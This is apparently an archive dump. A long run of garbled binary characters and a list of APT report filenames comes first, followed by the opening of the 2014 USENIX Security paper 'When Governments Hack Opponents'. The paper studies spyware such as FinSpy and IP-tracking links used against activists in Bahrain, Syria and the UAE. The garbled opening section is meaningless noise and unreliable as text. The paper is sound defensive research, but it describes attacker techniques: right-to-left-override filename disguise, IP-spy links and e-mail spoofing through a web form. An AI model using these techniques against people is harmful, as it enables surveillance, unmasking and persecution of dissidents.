(j5z
ab<G
R\V/
NbZk
Bx[Z
7od(7JY9_
@iC;:
DJ?R~
Y8$oC
/-@@
oZ?.auH&%
rdYXD
\;JO
fUD{
HN4"\
CeI+
3c<CU
Y_b)
q$^HO
}(`S
;/+k
SN?d=I<s
YuoA
;q>-3OZ
5s'7
20Q
_&lH
OhB1
_+Bm
A]*\
0:~0
{s'U
g43C
A?$*
6Fhd
))]k
[}k~C
k>x6
7y$wOV
k810x]
@6"R
]S7sb
E-Uui
[pS!U
;;<ag
LXyH
}P-19
IpC6
n_P}a0
TDaK
nEi H
;k/uZ
0!]Br
E^GDQzK
1S,5
AEP[
1D5:ia
yse"I8
@[V,
x[h0s
S"_U
aA'd
YoI.:
=enr
JT:)M-
"@Yy
vD4 
tmFj
~umL
`\x~UR*
fZ&$
kaR|
6uMI
4EPr
AL%c>
--B'M
?NPQ
5L2Ew
x*whI=Q
Zzj~
~RrK3(YK[7
nqHfOu
xQ?w
1/&HzS
?4rQV
,oXBe4tC
Ct.lb_
wzxL
Peogp
K{"0K
Ek7
#V_V"
^+*e
z)wv
{W{B
w:-[
Kb4lp"0
xp@G|
{7h^,
D^z;l
S@f^
PA5;
:VCj
aZb%y
`l)H
KF[#
SWYZJ
, /"
9{> 
6pq?k>
siY&
]p&!
>%?h
OB#DYQ
 RC/
Xk.v"
lgx3R
J7Ee
aEF8tg
txPilA
Pp}p
?cXXtT
?i`v
:&Z
Rl}`
9{=%~Gi
e;`^
]eCH
&5k,]QVaRR
A<9U^
3K)`
3G-tH
!h*^L
Re)`#
{ngb
m?jy=
[1In
X_ybx
s>yw+C
:L<(
UicT
&:/R@
;1\/
qIe5
H%=@#
B~,J
\q|P
6RW4
)cFH"
?~x&
7}J\;
bL1s
u{n$
PNQ= 
d][9
}it>
?DLg
tj92cT
C0*M
=J2~
S5ak
/CL&
,nZkR
;tAj
I(<KT
)0CH
NpyL
sJ>*
r%1e4
[_i
60Lx
4byr
wb8D
Y9 rX
VO4X*L
O<G#
{NY_AR
+AX?
5,ah
S){MW
/L@_
C9bSOq
pEC8&2
#5:s
9,(%[
<6/{
HV'T
~c4{
6v?S
j.5m1
d/w8
S},e
:?&ed
K"%L
*\dQ
-MUN\L7
!r&h
4uBv
rj$l?
?wF`P
5xPgW
_\Bf-i
;/gI2
Ofk{
08ZhB+F
?hp#\
E> J
SW~D
VWd}K
U4["e
mt0v
xW=!
"spv
L4VPf
!U2C
IPBX"
|0rl
V9F^
arB(
1}~Xx
U<rct
targeted_attacks_against_the_energy_sector.pdf.txtUT
"axF
iWUG!
VOsL
-DIN
h78:
!?Z:
jaZl]7y6?
zgIL
{q'H
":_D
Lg<m
\^d:*b
WYY"e
c-xh
Ez,-Pcm
,v2/^
N[S7
>N<w
?1aUu
;sJEAJY
"ZU 
{\ZIk
Y][n*V
/X=`^
T<Ix
hKR9&
i}eC
fe6:
r.AHd
XEnL
R_xjY
k|2e
_z%]e
2'?y
R0q5
\IxR
1Ov.;
Usl[
S8ptH
)`sI
l6'$
(I6p
*e%t
{)Gb
-uHj
ipMsF#
bjVo#
,1EF
E<J
I?V3
47`d
QHle
`Oi<
0>?"
6rc7
F "8
ux:Wj
x#m*
#+NW
%o0k
Oh+3
v.m;~
xo'k7
jX&;
?*x(
),PmA
|o@cIB
lRE/
l#Sg|
kQg'
E!F:p
*DO=
RUud
G(}U
 LGZ
"p@5$
<]4<
;X=&P
^'/m5x
(!5j
I<l$
J^WQ
QVdD
cm)jR
2O0'
YcGy
?e0=m)Kj
}Bxm
@j\e
d+DZ
,(YCj
(3ba
QY? 
h+;pP
Fc[-y
uias
CWOS
s!@[p"^
m=U}
skE$
Y"8Iu
eP7-
Fx~;
TY*?
NSe:
Q:Qbh
'+1p
(::<
C1i(
kM,:
7h7s
4gaj
(,ZTs
[m`r_\
"byt4&@
PlH>
w/`#va
wp0b
W)qX
q#8XMi0
eGDO
!4[m
1soC
[H>t
a0@g(
0&55
WsC~
kRC:
B_Hl
JaxK
Z|.[Q
l>4e
]t S{ 
sn{
taTv
z!}x
`,<wC
\Lz)98
{QtQY
Mv^/
`.vb
z]x"vk
^Az>
Fz#~
r ^|
+y.JD8
dZDP
]?b,#^
swhI
EALH
SIOHR
b:*b
N7=T/
a"1D*&.
fuc{-
NL;5
ZTc?A(
CnUEI
I&}k
2xmLa
19s2
+qS`
(xc>S
w7tO
uA(M(o
Hc6"
ZOE(5
0+)KZ
7'p4
7Ws4
[2W!
 1#>
LjTb
<I(yc
cmzfn
7<@v
EL[7|w
kl/m
BW6c
e@$S
y{cN
WSFY
)bd(
#/o?
rY`j
Lht6=>
Q$C+
KbW~}
`i-~_
{_,18
l~Xo7
GVL1^
$2}~f
vfav
#s@d
bwq\t
P!S
lLqu*UL
qUd;
z"y4
;a"C
M_>bD
/6i]
1<6
C1t=X
>>R~
eYEeL[
N2QV;
t:4G
c?H$
Mq-2
JPB-
Cp=I
0EW a
,zBa=
K#,ed}hij
4%L+xz
CjXY8
@ST@
a-d&l=
~&N^
Et`.
{F2R
d;S[c
nxRS
Eh}F
{r8vWe
SY&U
u\~bq
eh?
,IBf"
}0r{a
ek*aK
./{gf!
ERAzD
bx\AX
bu%+
?3+Dj
"*>6
<N$M
/JDH
H\:!k
e'$zT[
f3^]g
2{8Eg
:`O\
ZKhf
06Y(
wTpG@
Xn;VE}
a4^9@
d)N8
:!+Aa
+Uu'
<?Qr
Ww2l
Dvx
<m61DD
C%*cv
O'<4)
E,Ya
v{'p
t5@=
h.nV8_
cu!
Uy{g
"ZC)
Eq: gI
xgCYrL
Q>H$
/NO6
8:TB
A@oKC
I DF
fo\9
{CJ@
Q|t61X
><hc
QD!n(
Qz4k
m\gS
5V;*
5X&E
[\SQu
<%V~
_yBL
!74Zs
*2-n
_L%m
yS?Q
)g%3,
\7|_
DVfe
AdversaryIntelligenceReport_DeepPanda_0 (1).pdf.txtUT
Aided_Frame_Aided_Direction.pdf.txtUT
Alienvault_Scanbox.pdf.txtUT
CloudAtlas_RedOctober_APT.pdf.txtUT
Jl.M
Compromise_Greece_Beijing.pdf.txtUT
Cylance_Operation_Cleaver_Report.pdf.txtUT
HPSR SecurityBriefing_Episode16_NorthKorea.pdf.txtUT
Hikit_Analysis-Final.pdf.txtUT
Korplug_Afghanistan_Tajikistan.pdf.txtUT
Micro-Targeted-Malvertising-WP-10-27-14-1.pdf.txtUT
Miniduke_twitter.pdf.txtUT
NYTimes_Attackers_Evolve_Quickly.pdf.txtUT
NetTraveler_Makeover_10th_Birthday.pdf.txtUT
OnionDuke_Tor.pdf.txtUT
OperationDoubleTap.pdf.txtUT
Operation_CloudyOmega_Ichitaro.pdf.txtUT
Operation_GreedyWonk.pdf.txtUT
Operation_Poisoned_Handover.pdf.txtUT
Operation_SnowMan.pdf.txtUT
J.VZm
Pitty_Tiger_Final_Report.pdf.txtUT
Regis_The_Intercept.pdf.txtUT
JZ3
TA14-353A_wiper.pdf.txtUT
Targeting_Syrian_ISIS_Critics.pdf.txtUT
The_Epic_Turla_Operation.pdf.txtUT
The_Monju_Incident.pdf.txtUT
The_Uroburos_case.pdf.txtUT
ThreatConnect_Operation_Arachnophobia_Report.pdf.txtUT
apt28.pdf.txtUT
bcs_wp_InceptionReport_EN_v12914.pdf.txtUT
darkhotel_kl_07.11.pdf.txtUT
darkhotelappendixindicators_kl.pdf.txtUT
fireeye-operation-saffron-rose.pdf.txtUT
fireeye-sidewinder-targeted-attack.pdf.txtUT
operation-poisoned-helmand.pdf.txtUT
putter-panda.pdf.txtUT
regin-analysis.pdf.txtUT
sec14-paper-marczak.pdf.txtUT
snake_whitepaper.pdf.txtUT
targeted_attacks_against_the_energy_sector.pdf.txtUT
         When Governments Hack Opponents:
          A Look at Actors and Technology
     William R. Marczak, University of California, Berkeley, and The Citizen Lab;
    John Scott-Railton, University of California, Los Angeles, and The Citizen Lab;
Morgan Marquis-Boire, The Citizen Lab; Vern Paxson, University of California, Berkeley,
                    and International Computer Science Institute
   https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/marczak
            This paper is included in the Proceedings of the
                   23rd USENIX Security Symposium.
                           August 20
22, 2014 
 San Diego, CA
                                     ISBN 978-1-931971-15-7
                                                   Open access to the Proceedings of
                                                 the 23rd USENIX Security Symposium
                                                        is sponsored by USENIX
    When Governments Hack Opponents: A Look at Actors and Technology
             William R. Marczak                         John Scott-Railton                  Morgan Marquis-Boire
            UC Berkeley, Citizen Lab                    UCLA, Citizen Lab                       Citizen Lab
                                                         Vern Paxson
                                                       UC Berkeley, ICSI
Abstract                                                             we provide extensive detail from both technical and operational
                                                                     perspectives as seen in three countries. We view such character-
Repressive nation-states have long monitored telecommunica-          izations as the fundamental first step necessary for the rigorous,
tions to keep tabs on political dissent. The Internet and online     scientific pursuit of a new problem space.
social networks, however, pose novel technical challenges to            For our study we draw upon several years of research we
this practice, even as they open up new domains for surveil-         have conducted into cases from Bahrain, Syria and the United
lance. We analyze an extensive collection of suspicious files        Arab Emirates. We frame the nature of these attacks, and the
and links targeting activists, opposition members, and non-          technology and infrastructure used to conduct them, in the con-
governmental organizations in the Middle East over the past          text of their impacts on real people. We hope in the process to
several years. We find that these artifacts reflect efforts to at-   inspire additional research efforts addressing the difficult prob-
tack targets
 devices for the purposes of eavesdropping, stealing    lem of how to adequately protect individuals with very limited
information, and/or unmasking anonymous users. We describe           resources facing powerful adversaries.
attack campaigns we have observed in Bahrain, Syria, and the            As an illustration of this phenomenon, consider the follow-
United Arab Emirates, investigating attackers, tools, and tech-      ing anecdote, pieced together from public reports and court
niques. In addition to off-the-shelf remote access trojans and       documents.
the use of third-party IP-tracking services, we identify commer-        At dawn on 3/12/13,1 police raided the house of 17-year-
cial spyware marketed exclusively to governments, including          old Ali Al-Shofa, confiscated his laptop and phone, and took
Gamma
s FinSpy and Hacking Team
s Remote Control Sys-                him into custody. He was charged with referring to Bahrain
tem (RCS). We describe their use in Bahrain and the UAE, and         King as a 
dictator
 (         ) and 
fallen one
 (         ) on a
map out the potential broader scope of this activity by conduct-
                                                                     pseudonymous Twitter account, @alkawarahnews. Accord-
ing global scans of the corresponding command-and-control
                                                                     ing to court documents, Bahrain
s Cyber Crime Unit had linked
(C&C) servers. Finally, we frame the real-world consequences
                                                                     an IP address registered in his father
s name to the account on
of these campaigns via strong circumstantial evidence linking
                                                                     12/9/12. Operators of @alkawarahnews later forwarded a
hacking to arrests, interrogations, and imprisonment.
                                                                     suspicious private message to one of the authors. The message
                                                                     was received on 12/8/12 on a Facebook account linked to the
                                                                     Twitter handle, and contained a link to a protest video, purport-
1    Introduction                                                    edly sent by an anti-government individual. The link redirected
                                                                     through iplogger.org, a service that records the IP address
Computer security research devotes extensive efforts to pro-
                                                                     of anyone who clicks. Analytics for the link indicate that it had
tecting individuals against indiscriminate, large-scale attacks
                                                                     been clicked once from inside Bahrain. On 6/25/13, Ali was
such as those used by cybercriminals. Recently, the prob-
                                                                     sentenced to one year in prison.
lem of protecting institutions against targeted attacks conducted
                                                                        Ali
s case is an example of the larger phenomenon we in-
by nation-states (so-called 
Advanced Persistent Threats
) has
                                                                     vestigate: attacks against activists, dissidents, trade unionists,
likewise elicited significant research interest. Where these two
                                                                     human rights campaigners, journalists, and members of NGOs
problem domains intersect, however
targeted cyber attacks by
                                                                     (henceforth 
targets
) in the Middle East. The attacks we have
nation-states against individuals
has received virtually no sig-
                                                                     documented usually involve the use of malicious links or e-mail
nificant, methodical research attention to date. This new prob-
                                                                     attachments, designed to obtain information from a device. On
lem space poses challenges that are both technically complex
                                                                     the one hand, we have observed attacks using a wide range of
and of significant real-world importance.
                                                                     off-the-shelf spyware, as well as publicly available third-party
   In this work we undertake to characterize the emergent prob-      services, like iplogger.org. On the other hand, some at-
lem space of nation-state Internet attacks against individuals       tacks use so-called 
lawful intercept
 trojans and related equip-
engaged in pro-democracy or opposition movements. While
we lack the data to do so in a fully comprehensive fashion,             1 Dates   in the paper are given MM/DD/YY.
USENIX Association 
                                                                         23rd USENIX Security Symposium
 511
ment, purportedly sold exclusively to governments by compa-               do so in a sufficiently well-grounded, meaningful manner first
nies like Gamma International and Hacking Team. The lat-                  requires developing an understanding of the targets
 knowledge
ter advertises that governments need its technology to 
look              of security issues, their posture regarding how they currently
through their target
s eyes
 rather than rely solely on 
passive          protect themselves, and the resources (including potentially ed-
monitoring
 [1]. Overall, the attacks we document are rarely              ucation) that they can draw upon. To this end, we are now con-
technically novel. In fact, we suspect that the majority of at-           ducting (with IRB approval) in-depth interviews with potential
tacks could be substantially limited via well-known security              targets along with systematic examination of their Internet de-
practices, settings, and software updates. Yet, the attacks are           vices in order to develop such an understanding.
noteworthy for their careful social engineering, their links to
governments, and their real-world impact.
   We obtained the majority of our artifacts by encouraging in-           2    Related Work
dividuals who might be targeted by governments to provide us
with suspicious files and unsolicited links, especially from un-          In the past decades, a rich body of academic work has grown to
familiar senders. While this process has provided a rich set of           document and understand government Internet censorship, in-
artifacts to analyze, it does not permit us to claim our dataset is       cluding nationwide censorship campaigns like the Great Fire-
representative.                                                           wall of China [9, 10, 11]. Research on governmental Internet
   Our analysis links these attacks with a common class of ac-            surveillance and activities like law-enforcement interception is
tor: an attacker whose behavior, choice of target, or use of in-          a comparatively smaller area [12]. Some academic work looks
formation obtained in the attack, aligns with the interests of a          at government use of devices to enable censorship, such as key-
government. In some cases, such as Ali
s, the attackers appear            word blacklists for Chinese chat clients [13], or the Green Dam
to be governments themselves; in other cases, they appear in-             censorware that was to be deployed on all new computers sold
stead to be pro-government actors, ranging from patriotic, not            in China [14]. We are aware of only limited previous work
necessarily skilled volunteers to cyber mercenaries. The phe-             looking at advanced threat actors targeting activists with hack-
nomenon has been identified before, such as in Libya, when                ing, though this work has not always been able to establish ev-
the fall of Gaddafi
s regime revealed direct government ties to           idence of government connections [15].
hacking during the 2011 Civil War [2].                                       Platforms used by potential targets, such as GMail [16],
   We make the following contributions:                                   Twitter [17], and Facebook [18] increasingly make transport-
 We analyze the technology associated with targeted at-               layer encryption the default, obscuring communications from
     tacks (e.g., malicious links, spyware), and trace it back            most network surveillance. This use of encryption, along with
     to its programmers and manufacturers. While the attacks              the global nature of many social movements, and the role of
     are not novel
and indeed often involve technology used               diaspora groups, likely makes hacking increasingly attractive,
     by the cybercrime underground
they are significant be-               especially to states who are unable to request or compel content
     cause they have a real-world impact and visibility, and              from these platforms. Indeed, the increasing use of encryption
     are connected to governments. In addition, we often find             and the global nature of targets have both been cited by pur-
     amateurish mistakes in either the attacker
s technology or           veyors of 
lawful intercept
 trojans in their marketing materi-
     operations, indicating that energy spent countering these            als [1, 19]. In one notable case in 2009, UAE telecom firm Eti-
     threats can realize significant benefits. We do not, how-            salat distributed a system update to its then 145,000 BlackBerry
     ever, conclude that all nation-state attacks or attackers            subscribers that contained spyware to read encrypted Black-
     are incompetent, and we suspect that some attacks have               Berry e-mail from the device. The spyware was discovered
     evaded our detection.                                                when the update drastically slowed users
 phones [20]. In con-
                                                                          trast to country-scale distribution, our work looks at this kind of
 When possible, we empirically characterize the attacks
                                                                          pro-government and government-linked surveillance through
     and technology we have observed. We map out global
                                                                          highly targeted attacks.
     use of two commercial hacking tools by governments by
     searching through Internet scan data using fingerprints for             The term APT (Advanced Persistent Threat) refers to a
     command-and-control (C&C) servers derived from our                   sophisticated cyber-attacker who persistently attempts to tar-
     spyware analysis.                                                    get an individual or group [21]. Work outside the academic
                                                                          community tracking government cyberattacks typically falls
 We develop strong evidence tying attacks to govern-                  under this umbrella. There has been significant work on
     ment sponsors and corporate suppliers, countering de-                APT outside the academic community, especially among se-
     nials, sometimes energetic and sometimes indirect, of                curity professionals, threat intelligence companies, and human
     such involvement [3, 4, 5, 6], in contrast to denials [7]            rights groups. Much of this work has focused on suspected
     or claims of a corporate 
oversight
 board [8]. Our scan-            government-on-government or government-on-corporation cy-
     ning suggests use of 
lawful intercept
 trojans by 11 ad-            ber attacks [22, 23]. Meanwhile, a small but growing body
     ditional countries considered governed by 
authoritarian             of this research deals with attacks carried out by governments
     regimes.
 We believe that activists and journalists in such          against opposition and activist groups operating within, as well
     countries may experience harassment or consequences to               as outside their borders. One of the most notable cases is
     life or liberty from government surveillance.                        GhostNet, a large-scale cyber espionage campaign against the
   Finally, we do not explore potential defenses appropriate for          Tibetan independence movement [24, 25]. Other work avoids
protecting the target population in this work. We believe that to         drawing conclusions about the attackers [26].
                                                                      2
 23rd USENIX Security Symposium
                                                                                  USENIX Association
    Country   Date Range          Range of Targets                               Number and Type of Samples                              Distinct Malware C&C
    Bahrain   4/9/12
             
 12 activists, dissidents, trade unionists,   8 FinSpy samples, 7 IP spy links received via private   4 distinct IP addresses
              7/31/13             human rights campaigners, and journalists      message, > 200 IP spy links observed publicly
    Syria     2011 to present     10
20 individuals with technical back-         40
50: predominantly BlackShades, DarkComet,            160 distinct IP addresses
                                  grounds who receive suspect files from their   Xtreme RAT, njRAT, ShadowTech RAT.
                                  contacts
    UAE       7/23/12
            7 activists, human rights campaigners, and     31 distinct malware samples spanning 7 types; 5 dis-    12 distinct IP addresses
              7/31/13             journalists                                    tinct exploits
                                                         Table 1: Range of data for the study.
    Country   Possible Impacts                  Probable Impacts
    Bahrain   1. 3 individuals arrested, sen-   1. Activist serving 1 yr in
              tenced to 1
12 mo in prison       prison
              2. Union leader questioned by     2. Police raid on house
              police; fired
    Syria     1. Sensitive opposition com-      1. Opposition members dis-
              munications exposed to gov-       credited by publishing embar-
              ernment                           rassing materials
              2. Exfiltrated material used to   2. Exfiltrated materials used
              identify and detain activists     during interrogation by secu-
                                                rity services
    UAE       Contacts targeted via mal-        Password stolen,        e-mail
              ware                              downloaded
Table 2: Negative outcomes plausibly or quite likely aris-
ing from attacks analyzed.                                                                         Figure 1: E-mail containing FinSpy.
                                                                                     4.1      Bahrain
3      Data Overview and Implications
                                                                                     We have analyzed two attack campaigns in the context of
Our study is based on extensive analysis of malicious files and                      Bahrain, where the government has been pursuing a crackdown
suspect communications relevant to the activities of targeted                        against an Arab-Spring inspired uprising since 2/14/2011.
groups in Bahrain, Syria, and the UAE, as documented in Ta-                             The first involved malicious e-mails containing FinSpy, a
ble 1. A number of the attacks had significant real-world impli-                     
lawful intercept
 trojan sold exclusively to governments. The
cations, per Table 2. In many cases, we keep our descriptions                        second involved specially crafted IP spy links and e-mails de-
somewhat imprecise to avoid potential leakage of target identi-                      signed to reveal the IP addresses of operators of pseudonymous
ties.                                                                                accounts. Some individuals who apparently clicked on these
   We began our work when contacted by individuals con-                              links were later arrested, including Ali (cf. 
1), whose click
cerned that a government might have targeted them for cyber-                         appears to have been used against him in court. While both
attacks. As we became more acquainted with the targeted com-                         campaigns point back to the government, we have not as yet
munities, in some cases we contacted targeted groups directly;                       identified overlap between the campaigns; targets of FinSpy
in others, we reached out to individuals with connections to tar-                    appeared to reside mainly outside Bahrain, whereas the IP spy
geted groups, who allowed us to examine their communications                         links targeted those mainly inside the country. We examine
with the groups. For Bahrain and Syria, the work encompassed                         each campaign in turn.
10,000s of e-mails and instant messages. For the UAE, the vol-
ume is several thousand communications.
                                                                                     FinSpy Campaign. Beginning in April 2012, the authors
                                                                                     received 5 suspicious e-mails from US and UK-based activists
4      Case Studies: Three Countries                                                 and journalists working on Bahrain.        We found that some
                                                                                     of the attachments contained a PE (.exe) file designed to
This following sections outline recent targeted hacking cam-                         appear as an image.         Their filenames contained a Uni-
paigns in Bahrain, Syria and the UAE. These cases have a com-                        code right-to-left override (RLO) character, causing Windows
mon theme: attacks against targets
 computers and devices with                       to render a filename such as gpj.1bajaR.exe instead as
malicious files and links. In some cases the attackers employed                      exe.Rajab1.jpg.
expensive and 
government exclusive
 malware, while in other                            The other .rar files contained a Word document with an
cases, attackers used cheap and readily available RATs. Across                       embedded ASCII-encoded PE file containing a custom macro
these cases we find that clever social engineering often plays                       set to automatically run upon document startup. Under default
a central role, which is strong evidence of a well-informed ad-                      security settings, Office disables all unsigned macros, so that
versary. We also, however, frequently find technical and op-                         a user who opens the document will only see an informational
erational errors by the attackers that enable us to link attacks                     message that the macro has been disabled. Thus, this attack was
to governments. In general, the attacks we find are not well-                        apparently designed with the belief or hope that targets would
detected by anti-virus programs.                                                     have reduced security settings.
                                                                                 3
USENIX Association 
                                                                                            23rd USENIX Security Symposium
 513
   Identification as FinSpy: By running the sample using                  ated with another government [4]. However, a proxy would
Windows Virtual PC, we found the following string in mem-                 show gaps in a global IPID as it forwarded traffic; our frequent
ory: y:\lsvn_branches\finspyv4.01\finspyv2\.                              observation of strictly consecutive IPIDs thus contradicts this
This string suggests FinSpy, a product of Gamma Inter-                    statement.
national [27]. The executables used virtualized obfusca-                     Exploitation of captured data: Since we suspected the spy-
tion [28], which appeared to be custom-designed. We de-                   ware operator would likely seek to exploit captured credentials,
vised a fingerprint for the obfuscater and located a structurally         particularly those associated with Bahraini activist organiza-
similar executable by searching a large malware database.                 tions, we worked with Bahrain Watch, an activist organization
This executable contained a similar string, except it identi-             inside Bahrain. Bahrain Watch established a fake login page
fied itself as FinSpy v3.00, and attempted to connect to                  on their website and provided us with a username and pass-
tiger.gamma-international.de, a domain registered                         word. From a clean VM, we logged in using these credentials,
to Gamma International GmbH.                                              saving the password in Mozilla Firefox. We then infected the
   Analysis of capabilities: We found that the spyware has                VM with FinSpy and allowed it to connect to the Bahrain C&C
a modular design, and can download additional modules from                server. Bahrain Watch
s website logs revealed a subsequent
a command & control (C&C) server, including password cap-                 hit from 89.148.0.41
made however to the site
s home-
ture (from over 20 applications) and recording of screenshots,            page, rather than its login page
coming shortly after we had
Skype chat, file transfers, and input from the computer
s micro-          infected the VM. Decrypting packet captures of the spyware
phone and webcam.                                                         activity, we found that our VM sent the password to the server
   To exfiltrate data back to the C&C server, a module encrypts           exactly one minute earlier:
and writes it to disk in a special folder. The spyware period-
ically probes this folder for files that match a certain naming           INDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,
convention, then sends them to the C&C server. It then over-              PASSWORD FIELD,FILE,HTTP 1,
writes the files, renames them several times, and deletes them,           http://bahrainwatch.org,bhwatch1,watchba7rain,
                                                                          username,password,signons.sqlite,,
in an apparent effort to frustrate forensic analysis.                     Very Strong,3.5/4.x
   Analysis of encryption: Because the malware employed
myriad known anti-debugging and anti-analysis techniques, it                 The URL provided to the server did not include the path
thwarted our attempts to attach debuggers. Since it did not in-           to the login page, which was inaccessible from the home-
clude anti-VM code, we ran it in TEMU, an x86 emulator de-                page. This omission reflects the fact that the Firefox password
signed for malware analysis [29]. TEMU captures instruction-              database stores only domain names, not full login page URLs,
level execution traces and provides support for taint-tracking.           for each password. Repeating the experiment again yielded a
   We found that FinSpy encrypts data using a custom imple-               hit from the same IP address within a minute. We inspected
mentation of AES-256-CBC. The 32 byte AES key and 16 byte                 Bahrain Watch
s logs, which showed no subsequent (or previ-
IV are generated by repeatedly reading the low-order-4-bytes of           ous) activity from that address, nor any instances of the same
the Windows clock. The key and IV are encrypted using an em-              User Agent string.
bedded RSA-2048 public key, and stored in the same file as the
data. The private key presumably resides on the C&C server.
The weak AES keys make decryption of the data straightfor-                IP spy Campaign. In an IP spy attack, the attacker aims to
ward. We wrote a program that generally can find these keys in            discover the IP address of a victim who is typically the opera-
under an hour, exploiting the fact that many of the system clock          tor of a pseudonymous social media or e-mail account. The at-
readings occur within the same clock-update quantum.                      tacker sends the pseudonymous account a link to a webpage or
   In addition, FinSpy
s AES code fails to encrypt the last block         an e-mail containing an embedded remote image, using one of
of data if less than the AES block size of 128 bits, leaving trail-       many freely-available services.2 When the victim clicks on the
ing plaintext. Finally, FinSpy
s wire protocol for C&C commu-             link or opens the e-mail, their IP address is revealed to the at-
nication uses the same type of encryption, and thus is subject            tacker.3 The attacker then discovers the victim
s identity from
to the same brute force attack on AES keys. While we suspect              their ISP. In one case we identified legal documents that pro-
FinSpy
s cryptographic deficiencies reflect bugs, it is also con-         vided a circumstantial link between such a spy link and a sub-
ceivable that the cryptography was deliberately weakened to               sequent arrest.
facilitate one government monitoring the surveillance of oth-                Figure 2 illustrates the larger ecosystem of these attacks. The
ers.                                                                      attackers appear to represent a single entity, as the activity all
   C&C server:            The samples communicated with                   connects back to accounts that sent links shortened using a par-
77.69.140.194, which belongs to a subscriber of                           ticular user account al9mood4 on the bit.ly URL shortening
Batelco, Bahrain
s main ISP. Analyzing network traffic                    service.
between our infected VM and the C&C server revealed that                     Recall Ali Faisal Al-Shufa (discussed in Section 1), who
the server used a global IPID, which allowed us to infer server           was accused of sending insulting tweets from an account
activity by its progression.                                                 2 e.g.,
                                                                                   iplogger.org, ip-spy.com, ReadNotify.com.
   In response to our preliminary work an executive at Gamma                 3 Several webmail providers and e-mail clients take limited steps to
told the press that Bahrain
s FinSpy server was merely a proxy            automatically block loading this content, but e-mails spoofed to come
and the real server could have been anywhere, as part of a claim          from a trusted sender sometimes bypass these defenses.
that the Bahrain FinSpy deployment could have been associ-                   4 A Romanization of the Arabic word for 
steadfastness.
                                                                      4
 23rd USENIX Security Symposium
                                                                                     USENIX Association
                                                                                                                                                     feb14truth.webs.com
                                                                                                               Bit.ly user
                  iplogger.org                                                                                 Al9mood
                                                       Twitter ID
                                                      485527587                             Bahrain Gov't
                                 Jehad Abdulla                                                                                          Twitter ID
                                                         Salman Darwish
                                  (Gov't critic)                                                                                       987487705
                                                            Arrested
                                                                       Account begins
                                                                     sending IP spy links
                                                Red Sky
                                              (Translator)   Arrested
                                                                                                                                         fatoomah85@gmail.com
                                                                                                                       Twitter ID
                                                                                                                      485500245
                                                         Al Kawarah News Clicked
                                                                                             Ali Al-Shufa
                                                          (Village media)  link                                                                 ReadNotify.com
                                                                                              Arrested
                        ip-spy.com
                                                                       M        Clicked
                                                                                             House raid
                                                                (Village media)   link                                                Maryam                Sayed Yousif
                                                     Yokogawa Union                             Sami Abdulaziz Yokogawa
                                                      (Trade union)                             Fired from job Middle East
                                                                                     Legend
                    Actor   Spyware     C&C    Domain name     Packer    Target   Infection Targeted        Exploit      E-Mail     Consequence Attacker Bait Document
                                               Figure 2: The ecosystem of Bahrain 
IP spy
 attacks.
@alkawarahnews (Al Kawarah News in Figure 2). An op-                                            revolved around Tweets that referred to Bahrain
s King as a
erator of the account forwarded us a suspicious private message                                 
cursed one.
 Red Sky had earlier targeted other users with IP
sent to the Al Kawarah News Facebook account from Red Sky.                                      spy links shortened using the al9mood bit.ly account.
Red Sky was purportedly arrested on 10/17/12, was convicted
                                                                                                   The attack on Jehad Abdulla is noteworthy, as the ac-
of insulting the King on his Twitter account @RedSky446,
                                                                                                count
s activity aligned with communities typically critical of
and was sentenced to four months prison.5 When released, he
                                                                                                Bahrain
s opposition. However, the account also directly crit-
found that the passwords for his Twitter, Facebook, and e-mail
                                                                                                icized the King on occasion, in one case referring to him as
accounts had been changed, and did not know how to recover
                                                                                                
weak
 and 
stingy.
 An account linked to al9mood sent Je-
his accounts.
                                                                                                had Abdulla an IP spy link on 10/2/12 in a public message. On
   The message that Red Sky
s account sent to Al Kawarah
                                                                                                10/16/12, Salman Darwish was arrested for insulting the King
News included a link shortened using Google
s goo.gl ser-
                                                                                                using the Jehad Abdulla account. He was sentenced to one
vice. We used the goo.gl API to access analytics for the link,
                                                                                                month in prison, partly on the basis of his confession. Salman
finding that it unshortened to iplogger.org/25SX and was
                                                                                                father claims that police denied Salman food, drink, and medi-
created on 12/8/12. The link had received only one click, which
                                                                                                cal care.
came from Bahrain with the referrer www.facebook.com.
   Ali
s case files contained a request from the Public Prose-                                     Another account linked to al9mood targeted @YLUBH, the
cution for information on an IP address that it had linked to Al                                Twitter account of Yokogawa Union, a trade union at the
Kawarah News about 22 hours after the link was created. Court                                   Bahraini branch of a Japanese company. @YLUBH received at
documents indicate that ISP data linked the IP address to Ali,                                  least three IP spy links in late 2012, sent via public Twitter mes-
and on this basis he was sentenced to one year in prison.                                       sages. Yokogawa fired the leader of the trade union, Sami Ab-
   Red Sky also targeted M in Figure 2. M recalled click-                                       dulaziz Hassan, on 3/23/13 [30]. It later emerged that Sami was
ing on a link from Red Sky while using an Internet connec-                                      indeed the operator of the @YLUBH account, and that the police
tion from one of the houses in M
s village. The house was                                       had called him in for questioning in relation to its tweets [31].
raided by police on 3/12/13, who were looking for the sub-
                                                                                                   Use of embedded remote images: We identified several
scriber of the house
s internet connection. Police questioning
                                                                                                targets who received spoofed e-mails containing embedded
   5 According to information we received from two Twitter users, one                           remote images. Figure 2 shows two such cases, Maryam
of whom claimed to have met Red Sky in prison; another to be a col-                             and Sayed Yousif. The attacker sent the e-mails using
league.                                                                                         ReadNotify.com, which records the user
s IP address upon
                                                                                            5
USENIX Association 
                                                                                                                  23rd USENIX Security Symposium
 515
their mail client downloading the remote image.6                            sophisticated than FinSpy and RCS, they share the same ba-
   While ReadNotify.com forbids spoofing in their TOS,                      sic functionality, including screen capture, keylogging, remote
the service has a vulnerability known to the attackers (and                 monitoring of webcams and microphones, remote shell, and file
which we confirmed) that allows spoofing the From address                   exfiltration.
by directly setting the parameters on a submission form on their                In the most common attack sequence we observed, illus-
website We have not found evidence suggesting this vulnerabil-              trated with three examples in Figure 3, the attacker seeds mal-
ity is publicly known, but it appears clear that the attacker ex-           ware via private chat messages, posts in opposition-controlled
ploited it, as the web form adds a X-Mai1er: RNwebmail                      social media groups, or e-mail. These techniques often limit
header not added when sending through ReadNotify.com
s                      the world-visibility of malicious files and links, slowing their
other supported methods. The header appeared in each e-mail                 detection by common AV products. Typically, targets receive
the targets forwarded to us.                                                either (1) a PE in a .zip or .rar, (2) a file download link, or
   When spoofing using this method, the original sender ad-                 (3) a link that will trigger a drive-by download. The messages
dress still appears in X-Sender and other headers. Accord-                  usually include text, often in Arabic, that attempts to persuade
